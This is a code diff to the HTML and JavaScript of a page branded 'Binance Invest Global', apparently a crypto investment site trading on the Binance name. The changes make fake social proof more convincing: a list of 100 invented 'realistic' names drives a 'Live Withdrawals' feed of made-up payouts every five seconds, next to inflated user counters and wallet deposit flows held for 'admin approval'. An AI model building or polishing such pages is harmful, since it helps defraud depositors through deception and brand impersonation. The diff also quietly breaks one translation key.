@@ -179,7 +179,7 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
     <div style="margin-top: 40px; background:#0c1117e8; border:1px solid #ffffff10; border-radius:16px; padding:25px; max-width:450px; margin-left:auto; margin-right:auto;">
         <h3 style="margin:0 0 10px 0; color:#fff;" data-t="contactUs">Contact Us</h3>
         <p class="muted" style="margin:0 0 15px 0; font-size:13px;" data-t="supportEmail">Support Email</p>
-        <a href="mailto:binancinvest11@gmail.com" style="display:inline-block; padding:10px 20px; background:rgba(240,185,11,0.1); border:1px solid var(--gold); border-radius:8px; color:var(--gold); text-decoration:none; font-weight:900; font-size:16px;">binancinvest11@gmail.com</a>
+        <a href="mailto:binancinvest@zohomail.eu" style="display:inline-block; padding:10px 20px; background:rgba(240,185,11,0.1); border:1px solid var(--gold); border-radius:8px; color:var(--gold); text-decoration:none; font-weight:900; font-size:16px;">binancinvest@zohomail.eu</a>
     </div>
     <div style="margin-top: 30px; font-size: 0.8rem;" data-t="footerCopy">&copy; 2026 Binance Invest Global. All rights reserved.</div>
 </div>
@@ -273,7 +273,7 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
       <div style="margin-top: 30px; text-align: center; border-top: 1px solid #ffffff10; padding-top: 25px;">
         <h3 data-t="contactUs" style="margin:0 0 5px 0;">Contact Us</h3>
         <p class="muted" data-t="supportEmail" style="margin:0 0 10px 0; font-size:12px;">Support Email</p>
-        <a href="mailto:binancinvest11@gmail.com" style="display:inline-block; padding:8px 16px; background:rgba(240,185,11,0.1); border:1px solid var(--gold); border-radius:8px; color:var(--gold); text-decoration:none; font-weight:bold; font-size:14px;">binancinvest11@gmail.com</a>
+        <a href="mailto:binancinvest@zohomail.eu" style="display:inline-block; padding:8px 16px; background:rgba(240,185,11,0.1); border:1px solid var(--gold); border-radius:8px; color:var(--gold); text-decoration:none; font-weight:bold; font-size:14px;">binancinvest@zohomail.eu</a>
       </div>
     </div>
   </div>
@@ -322,7 +322,7 @@ forgotPasswordText:"Forgot Password?",needAccountText:"Don't have an account? Si
 contactUs:"Contact Us", supportEmail:"Support Email", securityPartners:"Security Partners & Protection",
 platformStatsTitle:"Platform Statistics", statUsers:"Platform Users", statInvestors:"Active Investors", statPaid:"Total Profit Paid", statCapital:"Platform Capital", liveWithdrawalsTitle:"Live Withdrawals", justNow:"Just now",
 depAmountLabel:"Amount (USD):", depMethodLabel:"Select Payment Method:", depCryptoLabel:"Select Currency & Network:", depTxLabel:"Transaction Hash / Reference Code:", depSubmitBtn:"Submit Deposit Request",
-optDirect:"1. Direct Payment", optPaymentio:"2. Payment via Payment.io Gateway",
+optDirect:"1. Direct Payment", optPaymentio:"2. Payment via Payment.io / NowPayments Gateway",
 walletMsg:"<b>Wallet Address for selected network:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Please transfer the amount to this address and submit the TXID for admin approval.</small>",
 paymentioMsg:"<b>Payment.io / NowPayments Gateway selected.</b> Please use the secure widget below to complete your payment."
 },
@@ -348,7 +348,7 @@ walletMsg:"<b>آدرس ولت برای این شبکه:</b><br><span style='colo
 paymentioMsg:"درگاه پرداخت <b>Payment.io / NowPayments</b> انتخاب شد. لطفاً از طریق ویجت امن زیر پرداخت خود را انجام دهید."
 },
 az:{
-brand:"Binance İnvest",login:"Daxil ol",register:"Hesab yarat",logout:"Çıxış",overview:"Ümumi",markets:"Bazarlar",invest:"İnvestisiya",portfolio:"Portfel",transactions:"Əməliyyatlar",rewards:"Mükafatlar",profile:"Profil",
+brand:"Binance İnvest",login:"Daxil ol",register:"Hesab yarat",logout:"Çıxış",overview:"Ümumi",markets:"Bazarlar",invest:"İnvestisiya",portfolio:"Portfel",transactions:"Əməliyyatlar",rewards:"Mükafatlar",profil:"Profil",
 hero:"Gələcəyinizi ağıllı investisiya ilə qurun.",heroDesc:"Kriptovalyutaları və investisiya alətlərini peşəkar interfeysdə kəşf edin.",exploreInvest:"İnvestisiyalara bax",exploreMarkets:"Bazara bax",
 users:"Platforma istifadəçiləri",tracked:"İzlənən aktivlər",assets:"Rəqəmsal aktivlər",live:"Canlı bazarlar",uptime:"Platforma işləkliyi",top:"Ən yaxşı bazarlar",viewAll:"Hamısına bax",featured:"Seçilmiş investisiyalar",
 plans:"İnvestisiya planları",illustrative:"Nümunə gəlir",calculator:"İnvestisiya kalkulyatoru",amount:"Məbləğ",plan:"Plan",estimated:"Təxmini dəyər",
@@ -600,15 +600,36 @@ async function submitDepositRequest() {
     }
 }
 
-const fakeNames = ["Ali R.", "Sarah M.", "David K.", "Mohammad J.", "Elena T.", "Reza S.", "Alex B.", "Maria P.", "Aykhan M.", "Zahra F."];
-const fakeCoins = ["USDT", "BTC", "ETH", "BNB", "TRX", "SOL"];
+// 100 Realistic Names (No trailing dots, full realistic names)
+const fakeNames = [
+    "Alexander Smith", "Michael Johnson", "David Williams", "James Brown", "Robert Jones",
+    "William Miller", "Joseph Davis", "Thomas Garcia", "Charles Rodriguez", "Daniel Wilson",
+    "Benjamin Moore", "Lucas Taylor", "Henry Anderson", "Ethan Thomas", "Alexander Jackson",
+    "Sebastian White", "Jack Harris", "Aiden Martin", "Matthew Thompson", "Samuel Garcia",
+    "David Martinez", "Joseph Robinson", "Carter Clark", "Owen Rodriguez", "Wyatt Lewis",
+    "John Lee", "Luke Walker", "Gabriel Hall", "Anthony Allen", "Isaac Young",
+    "Grayson Hernandez", "Julian King", "Mateo Wright", "Lincoln Lopez", "Jaxon Hill",
+    "Liam Scott", "Noah Green", "Oliver Adams", "Elijah Baker", "Logan Gonzalez",
+    "Caleb Nelson", "Christian Carter", "Landon Mitchell", "Jonathan Perez", "Nolan Roberts",
+    "Hunter Turner", "Jeremiah Phillips", "Elias Campbell", "Aaron Parker", "Eli Evans",
+    "Connor Edwards", "Ezekiel Collins", "Addison Stewart", "Easton Sanchez", "Miles Morris",
+    "Santiago Rogers", "Leo Reed", "Cooper Cook", "Landen Morgan", "Hudson Bell",
+    "Asher Murphy", "Carson Bailey", "Leo Rivera", "Ezra Cooper", "Kingston Richardson",
+    "Tristan Cox", "Jordan Howard", "Ian Ward", "Cole Torres", "Axel Peterson",
+    "Theodore Gray", "Leonardo Ramirez", "Dominic James", "Josiah Watson", "Everett Brooks",
+    "Easton Kelly", "Roman Sanders", "Miles Price", "Greyson Bennett", "Sawyer Wood",
+    "Aria Smith", "Sophia Johnson", "Emma Williams", "Olivia Brown", "Ava Jones",
+    "Isabella Miller", "Mia Davis", "Harper Garcia", "Evelyn Rodriguez", "Abigail Wilson",
+    "Emily Moore", "Elizabeth Taylor", "Mila Anderson", "Ella Thomas", "Avery Jackson",
+    "Sofia White", "Camila Harris", "Aria Martin", "Scarlett Thompson", "Victoria Garcia",
+    "Reza Ahmadi", "Ali Karimi", "Sara Mohammadi", "Mohammad Jafari", "Fatemeh Zarei"
+];
 
 function addLiveWithdrawal() {
     let list = document.getElementById("liveWithdrawalsList");
     if(!list) return;
     let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-    let amount = (Math.random() * 990 + 10).toFixed(2);
-    let coin = fakeCoins[Math.floor(Math.random() * fakeCoins.length)];
+    let amount = (Math.random() * 990 + 10).toFixed(2); // Between $10 and $1,000
     let initial = name.charAt(0);
     let lang = localStorage.getItem("bi_lang") || "en";
     let justNowText = (T[lang] && T[lang].justNow) ? T[lang].justNow : T.en.justNow;
@@ -623,20 +644,15 @@ function addLiveWithdrawal() {
                 <span>${justNowText}</span>
             </div>
         </div>
-        <div class="live-amount">+$${amount} ${coin}</div>
+        <div class="live-amount">+$${amount} USD</div>
     `;
     list.prepend(div);
     if(list.children.length > 5) list.removeChild(list.lastChild);
 }
 
-function scheduleNextWithdrawal() {
-    setTimeout(() => {
-        addLiveWithdrawal();
-        scheduleNextWithdrawal();
-    }, Math.floor(Math.random() * 5000) + 3000);
-}
+// Exactly every 5 seconds
+setInterval(addLiveWithdrawal, 5000);
 setTimeout(() => { for(let i=0; i<3; i++) addLiveWithdrawal(); }, 500);
-scheduleNextWithdrawal();
 
 // Live updating and saving counters every 5 seconds
 let currentUsersCount = parseInt(localStorage.getItem("bi_platform_users")) || 1284901;
@@ -959,27 +975,16 @@ function setLang(l){
     let k = e.dataset.t;
     if(d[k]) e.textContent = d[k];
   });
-  
-  let optDirect = document.getElementById("opt-direct-payment");
-  let optPaymentio = document.getElementById("opt-paymentio");
-  if(optDirect) optDirect.textContent = d.optDirect || T.en.optDirect;
-  if(optPaymentio) optPaymentio.textContent = d.optPaymentio || T.en.optPaymentio;
-
-  let lockEl = document.getElementById("lockNotice");
-  if(lockEl) lockEl.textContent = d.lockNoticeText || T.en.lockNoticeText;
-  
-  renderPlans(); calc(); calcCustom(); togglePaymentDetails();
 }
 
-let savedUser = localStorage.getItem("bi_current_user");
-if(savedUser){
-  try{ currentUser = JSON.parse(savedUser); }catch(e){ currentUser = null; }
-}
-
-renderPlans(); renderTop(); renderTable(); prices(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); loadTransactions(); togglePaymentDetails();
+prices();
+renderPlans();
+renderTable();
+renderTop();
 setInterval(prices, 30000);
-document.getElementById("lang").value = localStorage.getItem("bi_lang") || "en";
-setLang(document.getElementById("lang").value);
+if(localStorage.getItem("bi_current_user")){
+  try{ currentUser = JSON.parse(localStorage.getItem("bi_current_user")); updateHeaderAuthUI(); loadProfile(); }catch(e){}
+}
 </script>
 </body>
 </html>
